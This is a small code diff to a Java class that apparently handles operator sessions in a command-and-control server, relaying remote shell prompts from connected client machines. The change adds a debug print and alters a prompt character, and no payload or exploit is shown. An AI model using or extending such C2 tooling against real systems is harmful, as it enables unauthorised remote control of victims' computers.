@@ -282,6 +282,7 @@ public class C2ServerUserHandler implements Runnable{
                 }
 
                 for(int i = messages.length - 1; i > 0; i--){
+                    System.out.println(messages[i]);
                     if(messages[i].toString().contains("C:\\")){
                         currentDirectory = messages[i].toString().trim().split(" ")[1];
                         break;
@@ -304,7 +305,7 @@ public class C2ServerUserHandler implements Runnable{
                 if(currentDirectory.contains("C:")){
                     System.out.print("PS " + currentDirectory + "> ");
                 } else {
-                    System.out.print("root@" + clientIP + ":" + currentDirectory + "# ");
+                    System.out.print("root@" + clientIP + ":" + currentDirectory + "$ ");
                 }
 
                 // Get command from user
